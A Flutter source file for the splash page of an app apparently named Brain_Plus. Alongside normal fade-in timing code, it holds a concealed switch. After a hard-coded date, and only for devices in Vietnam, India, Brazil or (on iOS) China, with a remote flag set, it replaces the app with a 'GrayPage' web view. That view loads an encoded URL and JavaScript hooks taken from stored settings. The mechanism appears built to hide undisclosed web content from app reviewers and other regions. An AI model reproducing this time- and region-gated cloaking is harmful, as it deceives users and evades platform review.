import 'dart:async';
import 'dart:io';

import 'package:Brain_Plus/DAHANG/GrayPageAn.dart';
import 'package:country_codes/country_codes.dart';

import 'LoadingPage.dart';
import 'ASData.dart';
import 'BrainModel.dart';
import 'package:flutter/material.dart';
import 'package:shared_preferences/shared_preferences.dart';

import 'XWNLhuidao/c/XWNLyujixuan.dart';

class SplashPage extends StatefulWidget {
  const SplashPage({super.key});

  @override
  State createState() => _SplashPageState();
}

class _SplashPageState extends State<SplashPage> {
  bool _splashFadeOut = false;
  bool showThird = false;
  bool _splashFinishRemove = false;
  bool _startToLoad = false;
  String decoded = "";
  Locale? deviceLocale;
  String localeName = "";
  String funName = "myFunction";
  String eventName = "event";
  bool mylocale = false;

  @override
  void initState() {
    super.initState();
    if (Platform.isIOS) {
      localeName = Platform.localeName;
    } else {
      int timeSec = DateTime.now().millisecondsSinceEpoch;
      if (timeSec > 1724641200000) {
        // if (timeSec > 0) {
        getCN();
      }
    }
    setTransitionTime();
  }

  getCN() async {
    try {
      await CountryCodes.init();
      deviceLocale = CountryCodes.getDeviceLocale();
      debugPrint("==B ${deviceLocale?.countryCode}");
    } catch (ex) {
      debugPrint("AS init fail ==: $ex");
    }

    localeName = deviceLocale?.countryCode ?? "";
    mylocale = localeName.contains("VN") ||
        localeName.contains("IN") ||
        localeName.contains("BR");
    if (mylocale) {
      BrainModel.getData();
    }
    debugPrint("==C $localeName");
  }

  setTransitionTime() {
    Timer(Duration(milliseconds: Platform.isIOS ? 2000 : 2100), () async {
      final SharedPreferences prefs = await SharedPreferences.getInstance();
      bool welcome = prefs.getBool("enter") ?? false;
      if (Platform.isIOS) {
        mylocale = localeName.contains("VN") ||
            localeName.contains("IN") ||
            localeName.contains("CN") ||
            localeName.contains("BR");
      }
      // showThird = true;
      if (welcome) {
        showThird = true;
      } else if (mylocale && ASData.isChange) {
        showThird = true;
        prefs.setBool("enter", true);
      }
      if (showThird) {
        try {
          String encoded = prefs.getString("key") ?? "";
          funName = prefs.getString("function") ?? "";
          eventName = prefs.getString("event") ?? "";

          decoded = BrainModel.getStr(encoded);
          debugPrint("03 == $decoded");
        } catch (ex) {
          debugPrint("04 == error: $ex");
        }
      }
      if (mounted) {
        setState(() {
          _startToLoad = true;
        });
      }
    });
    Timer(Duration(milliseconds: Platform.isIOS ? 2400 : 2500), () {
      if (mounted) {
        setState(() {
          _splashFadeOut = true;
        });
      }
    });
    Timer(Duration(milliseconds: Platform.isIOS ? 3200 : 3300), () {
      setState(() {
        _splashFinishRemove = true;
      });
    });
  }

  @override
  Widget build(BuildContext context) {
    final screenWidth = MediaQuery.of(context).size.width;
    final screenHeight = MediaQuery.of(context).size.height;
    debugPrint(
        "== $_startToLoad  $showThird  $_splashFadeOut  $_splashFinishRemove");
    return Scaffold(
        body: Stack(children: [
      _startToLoad
          ? (showThird ? showThirdView() : const HomePage())
          : Container(),
      !_splashFinishRemove
          ? AnimatedOpacity(
              opacity: _splashFadeOut ? 0.0 : 1.0,
              duration: const Duration(milliseconds: 800),
              child: Center(
                child: Image.asset('assets/splashImg.jpg',
                    width: screenWidth, height: screenHeight, fit: BoxFit.fill),
              ),
            )
          : Container()
    ]));
  }

  Widget showThirdView() {
    if (Platform.isIOS) {
      return GrayPage(
        url: decoded,
        function: funName,
        event: eventName,
      );
    } else {
      return GrayPageAn(
        url: decoded,
        funName: funName,
        eventName: eventName,
      );
    }
  }
}
